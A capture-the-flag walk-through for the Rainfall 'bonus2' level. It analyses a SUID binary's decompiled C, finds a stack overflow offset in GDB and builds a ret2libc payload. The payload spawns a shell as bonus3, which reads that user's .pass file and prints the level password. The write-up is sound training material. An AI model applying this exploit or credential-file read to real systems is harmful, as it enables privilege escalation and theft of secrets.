@@ -1,0 +1,191 @@
+# Walk-through bonus2
+
+## Introduction
+bonus2 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.
+
+## Security Checks
+Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:
+
+```bash
+bonus2@RainFall:~$ checksec --file bonus2 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bonus2
+```
+**Key observations:**
+> **No RELRO** : The binary does not protect against GOT overwrite attacks.
+
+> **No stack canary** : Buffer overflow attacks are possible.
+
+> **NX disabled** : Stack is executable, allowing shellcode execution.
+
+> **No PIE** : The binary has a fixed memory layout, making exploitation easier.
+
+### Analyzing `bonus0`
+
+After running the command `ls -l bonus2`, we observe the following output:
+```
+-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
+```
+
+From this output, we can see that the binary `bonus2` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:
+
+- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`bonus3`) and group (`users`), regardless of who executes it.
+- In other words, when any user runs this program, it will execute as if it were run by the `bonus3` user.
+
+## Debugging
+Consider the following session:
+
+```bash
+bonus2@RainFall:~$ ./bonus2
+bonus2@RainFall:~$ ./bonus2 test1
+bonus2@RainFall:~$ ./bonus2 test1 test2
+Hello test1 
+```
+
+After running *bonus2* with various arguments, we observe that when two arguments are provided (e.g., `test1` and `test2`), the program simply outputs `Hello test1`.
+
+## Code Analysis
+
+The relevant functions are:
+
+### 1. `main` Function
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[76];       // [esp+0h] [ebp-ACh] BYREF
+  char dest[76];      // [esp+50h] [ebp-5Ch] BYREF
+  char *v6;         // [esp+9Ch] [ebp-10h]
+
+  if ( argc != 3 )
+    return 1;
+  memset(dest, 0, sizeof(dest));
+  strncpy(dest, argv[1], 0x28u);
+  strncpy(&dest[40], argv[2], 0x20u);
+  v6 = getenv("LANG");
+  if ( v6 )
+  {
+    if ( !memcmp(v6, "fi", 2u) )
+    {
+      language = 1;
+    }
+    else if ( !memcmp(v6, "nl", 2u) )
+    {
+      language = 2;
+    }
+  }
+  qmemcpy(v4, dest, sizeof(v4));
+  return greetuser(v4[0]);
+}
+```
+
+**Explanation:**
+
+- The function declares two 76-byte buffers (`v4` and `dest`) and a pointer (`v6`).
+- It checks if exactly 3 arguments are provided. If not, the program exits with status 1.
+- It clears the `dest` buffer, then copies the first command-line argument into `dest` (up to 40 bytes) and the second argument into `dest` starting at offset 40 (up to 32 bytes).
+- It retrieves the `LANG` environment variable; if it starts with `"fi"` or `"nl"`, it sets the global variable `language` accordingly.
+- Finally, it copies the content of `dest` into `v4` and calls the `greetuser` function with the first byte of `v4`.
+
+### 2. `greetuser` Function
+
+```c
+int __cdecl greetuser(char src)
+{
+  __int128 dest;    // [esp+10h] [ebp-48h] BYREF
+  __int16 v3;       // [esp+20h] [ebp-38h]
+  char v4;          // [esp+22h] [ebp-36h]
+
+  switch ( language )
+  {
+    case 1:
+      dest = xmmword_8048717;
+      v3 = *((_WORD *)&xmmword_8048717 + 8);
+      v4 = *((_BYTE *)&xmmword_8048717 + 18);
+      break;
+    case 2:
+      strcpy((char *)&dest, "Goedemiddag! ");
+      break;
+    case 0:
+      strcpy((char *)&dest, "Hello ");
+      break;
+  }
+  strcat((char *)&dest, &src);
+  return puts((const char *)&dest);
+}
+```
+
+**Explanation:**
+
+- The function declares a 128-bit variable `dest`, a 16-bit variable `v3`, and a character `v4`.
+- Depending on the value of the global variable `language`, it initializes `dest` with a greeting:
+  - If `language` is 1, it uses a pre-defined value stored in `xmmword_8048717`.
+  - If `language` is 2, it copies `"Goedemiddag! "` into `dest`.
+  - If `language` is 0 (or any other value), it copies `"Hello "` into `dest`.
+- It then concatenates the input character (passed as the first byte of the buffer) to the greeting and prints the final string using `puts`.
+
+## Determining the Offset
+
+We use GDB to determine the offset:
+
+```bash
+gdb-peda$ r `python -c 'print("A" * 40)'` `python -c 'print("A" * 18 +  "BBBB")'`
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+```
+
+**GDB Register Output:**
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x51 ('Q')
+EBX: 0xbffff690 ('A' repeated 58 times, followed by "BBBB")
+ECX: 0xffffffff 
+EDX: 0xb7fd28b8 --> 0x0 
+ESI: 0xbffff6dc --> 0xbfffff33 --> 0x4c006966 ('fi')
+EDI: 0xbffff68c --> 0xb7e5ec73 (add    ebx,0x172381)
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff640 --> 0x41414100 ('')
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x210282 (carry, parity, adjust, zero, sign, trap, interrupt, direction, overflow)
+```
+
+The appearance of `BBBB` in the EIP register indicates that we control the return address. The first argument’s buffer fills up 40 bytes, and the second argument’s buffer reaches the return address after 18 additional bytes.
+
+## Exploitation Strategy
+
+We have determined the offset, and we note that the stack is executable because NX is disabled and PIE is not enabled. This means we could either inject shellcode or use a ret2libc attack. Since we have exploited previous levels by injecting shellcode, why not use ret2libc for this level?
+
+### RET2LIBC Overview
+
+A ret2libc (return-to-libc) attack does not require shellcode. Instead, the attacker reuses existing library code—specifically, the `system` function—to execute commands on the target system.
+
+To build our exploit, we need the addresses of `system` and `/bin/sh`.
+
+1. Start GDB with *bonus2* and set a breakpoint.
+2. Execute the following commands:
+
+```bash
+gdb-peda$ p system 
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+gdb-peda$ find /bin/sh
+Searching for '/bin/sh' in: None ranges
+Found 1 result(s), display max 1 items:
+libc : 0xb7f8cc58 ("/bin/sh")
+```
+Now we have all the ingredients needed for our payload:
+- The offset determined earlier.
+- The address of `system` (`0xb7e6b060`).
+- A fake return address (if needed).
+- The address of `/bin/sh` (`0xb7f8cc58`).
+
+## Proof-of-Concept (Working Exploit) 
+``` bash
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$  ./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("A" * 18 +  "\x60\xb0\xe6\xb7" + "BBBB" + "\x58\xcc\xf8\xb7")'`
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��BBBBX���
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
